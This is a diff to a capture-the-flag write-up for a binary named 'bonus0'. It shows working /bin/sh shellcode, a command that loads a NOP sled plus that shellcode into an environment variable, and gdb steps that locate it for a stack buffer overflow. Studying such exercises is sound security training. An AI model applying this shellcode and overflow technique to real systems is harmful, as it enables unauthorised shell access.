@@ -48,12 +48,12 @@ info function
 0x080485a4  main
 ```
 
-You can view the asm code [here](Ressources/assembly.asm)  
+You can view the commented asm code [here](Ressources/assembly.asm)  
 
-Buffer addresses:
-buf = 0xbffff6f6
-buf1 = 0xbffff6a8
-buf2 = 0xbffff6bc
+Buffer addresses:  
+buf = 0xbffff6f6  
+buf1 = 0xbffff6a8  
+buf2 = 0xbffff6bc  
 
 
 ### Execution
@@ -74,18 +74,21 @@ Program received signal SIGSEGV, Segmentation fault.
 The buffer is only 20 chars, so we only have 11 bytes available to inject a shellcode, which is not enough.
 
 Let's save our shellcode in an env variable:  
-*shellcode:* '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' - 45 chars
+*shellcode:*  
+```
+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' - 45 chars
 ```  
 
 The actual address of the shellcode must be known ahead of time, which can be difficult to know in a dynamically changing stack.
 By creating a large array (or sled) of these NOP instructions and placing it before the shellcode, if the EIP returns to any address found in the NOP sled, the EIP will increment while executing each NOP instruction, one at a time, until it finally reaches the shellcode. This means that as long as the return address is overwritten with any address found in the NOP sled, the EIP will slide down the sled to the shellcode, which will execute properly.  
 
-**Shellcode env:  **
+**Shellcode env:  **  
 ```
 export SHELLCODE=`python -c "print('\x90' * 100 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')"`
 ```  
 
 #### Find the Shellcode env variable address
+
 ```
 $> gdb bonus0
 (gdb) break main
@@ -96,7 +99,7 @@ Starting program: /home/user/bonus0/bonus0
 Breakpoint 1, 0x080485a7 in main ()
 (gdb) x/s *((char **)environ)
 0xbffff86c:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f̀1ۉ\330@̀\350\334\377\377\377/bin/sh"
-```
+```  
 
 the beginning of our NOP + shellcode is at address 0xbffff86c
 -> we have to choose an address that contains a NOP (\x90), so that it will sled into the beginning of our shellcode and execute it
